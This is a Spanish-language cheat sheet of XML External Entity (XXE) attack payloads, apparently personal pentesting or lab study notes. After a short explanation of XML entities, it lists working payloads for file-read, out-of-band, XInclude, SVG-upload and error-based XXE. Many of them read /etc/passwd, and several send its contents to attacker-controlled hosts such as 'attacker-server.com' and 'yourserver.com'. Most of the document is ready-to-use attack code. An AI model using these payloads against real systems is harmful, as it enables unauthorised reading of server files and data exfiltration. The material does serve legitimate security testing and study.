-- -
## Entidades:
Las entidades son una forma de representar un elemento de datos sin referenciar a los datos como tal, todo esto en un documento XML.

**Tipos de entidades:**
- Genéricas / Customizadas
- Externas (XXE)
- Predefinidas ---> General Entities
	- &lt (Lower Than);
	- &gt (Grater Than); 
- Entidades Parametricas ---> %nombre_entidad;
### Ejemplo de una estructura XML
```xml
<?xml version="1.0" encoding="UTF-8"?> ---> Declaración XML
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "mi entidad">]> ---> DTD (Document Type Definition)

<root>
	<name>fran</name>
	<tel>5454545as</tel>
	><email>fran@fran.com</email>
	><password>fran123</password>
</root>
```

-- -
# Normal XXE 
## Payloads: 
```xml
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
 ```

-- - 
# XXE Out Of Band interaction (OOB) 
## Payloads
 - Estas mismas son lo mismo que las anteriores solo que a ciegas:
```xml
<!DOCTYPE foo [ <!ENTITY myFile SYSTEM "http://192.168.64.128/testXXE"> ]>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://192.168.64.128/malicious.dtd"> %xxe; ]> # ---> Lo declaro ahi mismo ya que a veces no te deja declararlo en el propio cuerpo. 
```

**Archivo malicious.dtd 1:**
- Usa el wrapper de PHP "php://filter/convert.base64-encode/resource=/etc/passwd" para leer y codificar en Base64 el archivo /etc/passwd.
- Luego, intenta exfiltrar el contenido con una entidad exfil que envía la información a attacker-server.com.
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> 
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?file=%file;'>">
%stack; 
%exfil;
```

**Archivo malicious.dtd 2:**
- Define una entidad %file que lee /etc/passwd.
- Usa %stack para declarar exfil, que envía el contenido a un servidor remoto.
- Finalmente, ejecuta %stack; para que se resuelva la entidad.
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY exfil SYSTEM 'http://attacker-server.com/?file=%file;'>">
%stack;
```

**Archivo malicious.dtd 3:**
- Igual que `malicious.dtd 2` solo que no ejecuta la entidad.
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?file=%file;'>">
```

**Archivo malicious.dtd 4:**
- Intenta leer /etc/passwd.
- Usa error para forzar la lectura desde file://idontexist/%file;, lo que podría desencadenar un error útil para exfiltración indirecta (error-based XXE).
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % stack "<!ENTITY &#x25; error SYSTEM 'file://idontexist/%file;'>">
```
---
# Xinclude XXE 
### Testing
- Primero probamos declarar una entidad url-encodeada para ver como reacciona el servidor
```http
productId=1&storeId=1 ---> Request original
productId=%26entity%3b&storeId=1 ---> Entidad declarada y url-encodeada
```
- Si el servidor nos responde con una respuesta similar a "Entities are not allowed for security reasons" significa que esta procesando las entidades declaradas y el codigo XML.
## Payloads
**Normal Xinclude Injection**
```xml 
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>
```

**OOB**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://yourserver.serveo.net?data=file:///etc/passwd" parse="text"/></foo> 
```
---
# XXE via image File Upload
## Payloads
**Normal**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&file;</text>
</svg>

<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY file SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&file;</text>
</svg>
```
**OOB**
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://yourserver.com/?data=%file;">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&send;</text>
</svg>

<?xml version="1.0"?>
<!DOCTYPE svg [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % send SYSTEM "http://yourserver.com/?data=%file;">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="128px" height="128px">
    <text x="0" y="16" font-size="16">&send;</text>
</svg>
```

**Xinclude**
```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include href="file:///etc/passwd" parse="text"/>
</svg>
```
-- -
# XXE by repurposing local DTD 
### Testing
- Buscamos donde esta el local dtd en el sistema enviando este codigo xml como body al intruder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % myFile SYSTEM "file://LIST_WITH_LOCAL_DTD"> 
%myFile;]>
```

```xml 
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///LOCAL_DTD">

    <!ENTITY % expr 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///FILE_TO_READ">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;

```
---
## Aclaraciones:
- Siempre hay que "invocar" el nombre de la entidad dentro de la estructura XML para asi ejecutar el payload. (&myFile dentro de algun tag). 
- Siempre si no funciona probar sacar el %.

